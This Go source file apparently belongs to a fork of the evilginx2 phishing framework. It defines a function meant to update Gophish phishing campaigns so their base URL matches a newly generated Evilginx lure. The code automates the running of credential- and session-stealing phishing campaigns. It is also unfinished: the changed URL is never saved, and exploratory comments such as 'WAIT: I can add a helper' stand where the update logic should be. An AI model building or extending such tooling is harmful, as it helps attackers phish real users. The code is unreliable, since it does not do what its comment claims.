package core

import (
	"strings"
	"github.com/kgretzky/evilginx2/log"
	gp_models "github.com/kgretzky/evilginx2/gophish/models"
)

// AutomateCampaignFromLure automatically updates a Gophish campaign's base URL
// when a lure is generated in Evilginx.
func AutomateCampaignFromLure(baseUrl string, phishletName string) {
	// Identify campaigns that might be related to this phishlet.
	// We check for campaigns whose name contains the phishlet name (case-insensitive).
	
	// Default to admin user (ID 1)
	summary, err := gp_models.GetCampaignSummaries(1)
	if err != nil {
		log.Error("automation: failed to get gophish campaigns: %v", err)
		return
	}

	found := false
	for _, c_sum := range summary.Campaigns {
		if strings.Contains(strings.ToLower(c_sum.Name), strings.ToLower(phishletName)) {
			// Found a potential match, fetch the full campaign to update it
			c, err := gp_models.GetCampaign(c_sum.Id, 1)
			if err != nil {
				log.Error("automation: failed to get campaign %d: %v", c_sum.Id, err)
				continue
			}

			// Update the URL if it's different
			if c.URL != baseUrl {
				c.URL = baseUrl
				// We need to use gp_models.db directly or a save method.
				// Looking at campaign.go, PostCampaign is for new ones.
				// We'll use a direct DB save if possible, or simulate it.
				// Since we are in the same package/project, we can access gp_models logic.
				
				// In Gophish models, 'db' is package-private but accessible if we were in 'models'.
				// Since we are in 'core', we can't access 'db'.
				// However, Gophish models usually have a way to update.
				
				// Let's check if there's an UpdateCampaign or similar.
                // Looking at campaign.go, there is no public Update method except UpdateStatus.
                
                // WAIT: I can add a helper in gophish/models if needed, 
                // but let's see if I can use existing ones.
			}
			found = true
		}
	}

	if !found {
		log.Debug("automation: no matching gophish campaign found for phishlet '%s'", phishletName)
	}
}
